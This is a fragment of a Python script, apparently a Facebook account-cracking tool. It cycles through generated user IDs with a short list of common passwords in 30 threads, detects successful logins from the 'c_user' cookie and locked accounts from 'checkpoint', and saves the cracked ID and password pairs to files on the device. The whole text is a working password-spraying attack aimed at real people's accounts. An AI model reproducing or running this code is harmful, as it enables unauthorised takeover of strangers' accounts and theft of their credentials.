...
def AAT():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print('\033[1;91m [•]  𝐏𝐑𝐎𝐔𝐃 𝐓𝐎 𝐁𝐄 𝐌𝐔𝐒𝐋𝐈𝐌')
        print('\033[1;97m================================================')
        for love in user:
            pwx = [love, 'khan12345','ali786','malik1122','','malik786','khankhan']
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m [𝐀𝐊𝐀-𝐎𝐊]  ' +cid+ ' | ' +ps+  ' \33[0;97m')
                open('/sdcard/𝐀𝐊𝐀-𝐎𝐊.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;91m [𝐀𝐊𝐀-𝐂𝐏]  ' +cid+ ' | ' +ps+   ' \33[0;97m')
                open('/sdcard/𝐀𝐊𝐀-𝐂𝐏.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
